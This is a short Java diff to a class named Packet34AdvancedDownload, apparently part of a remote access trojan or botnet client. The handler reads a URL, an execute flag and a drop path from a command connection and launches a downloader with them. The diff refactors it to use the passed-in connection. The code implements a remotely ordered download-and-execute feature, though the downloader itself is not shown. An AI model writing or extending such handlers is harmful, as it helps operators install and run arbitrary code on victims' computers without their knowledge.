@@ -7,10 +7,10 @@ public class Packet34AdvancedDownload extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		String url = Connection.instance.readLine();
-		boolean exec = Connection.instance.readBoolean();
-		String drop = Connection.instance.readLine().toLowerCase();
-		new AdvancedDownloader(url, exec, drop).start();
+		String url = con.readLine();
+		boolean exec = con.readBoolean();
+		String drop = con.readLine().toLowerCase();
+		new AdvancedDownloader(con, url, exec, drop).start();
 	}
 
 }
